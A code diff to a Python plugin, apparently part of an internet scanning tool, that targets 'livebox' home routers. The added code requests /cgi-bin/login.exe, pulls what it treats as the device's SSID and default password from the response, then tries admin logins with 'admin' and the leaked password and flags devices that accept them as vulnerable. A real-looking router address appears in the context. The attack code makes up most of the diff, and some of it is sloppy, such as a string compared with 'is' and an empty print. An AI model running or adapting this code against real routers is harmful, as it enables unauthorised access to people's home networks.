@@ -19,7 +19,7 @@ http://85.56.33.38:8080/index.stm
 """
 import requests
 import core.logger as log
-from plugins.IPlugin import IPlugin, connection_type
+from .IPlugin import IPlugin, connection_type
 from bs4 import BeautifulSoup
 
 keywords = ['log',
@@ -58,6 +58,8 @@ def find_forms(page):
 					value = ''
 					if input.has_attr('value'):
 						value = input['value']
+					if input['type'] is 'password':
+						print("=>>>>", )						
 					if input.has_attr('name'):
 						fields[input['name']] = value
 					continue
@@ -76,6 +78,20 @@ def post_login(url, body):
 	finally:
 		return res
 
+def try_auth(url, password='admin'):
+	print(url[:-23])
+	url = "{}{}".format(url[:-23],'/cgi-bin/login.exe')
+	body = {'user': 'admin', 'pws': password}
+	log.info("ATTEMPT to LOGIN to {} -> {}".format(url, body))
+	try:
+		res = requests.post(url, data=body)
+		if res and 'info_statusnok' in res.text:
+			return False
+		log.info("SUCCESSFULL login to {} with {}".format(url, body))
+		return True
+	except Exception as e: log.err('Error POST to {} -> {}'.format(url, e))
+	return False
+
 class Plugin(IPlugin):
 	def __init__(self):
 		super().__init__()
@@ -88,7 +104,16 @@ class Plugin(IPlugin):
 
 	def exec(self, res):
 		log.debug("Executing plugin for ", res.url)
-		page = BeautifulSoup(res.text, 'html.parser')
+		if 'livebox' in res.text:
+			cred_page = requests.get('{}/{}'.format(res.url,'cgi-bin/login.exe'), allow_redirects=True, verify=False, timeout=5)
+			if cred_page and cred_page.status_code == 200:
+					arr = cred_page.text.split('\n')
+					ssid = arr[2][:-4]
+					password = arr[3][:-4]
+					log.info("Found SSID and default passwd for {} -> {}:{} ".format(res.url,ssid, password))
+					if try_auth(res.url) or try_auth(res.url, password):
+						log.info("VULNERABLE Device {} !!".format(res.url))
+		'''
 		if page:
 			action, body = find_forms(page)
 			if action and body:
@@ -99,3 +124,4 @@ class Plugin(IPlugin):
 				log.debug("No login form found from ", res.url)
 		else:
 			log.debug("No DOM found from ", res.url)
+		'''
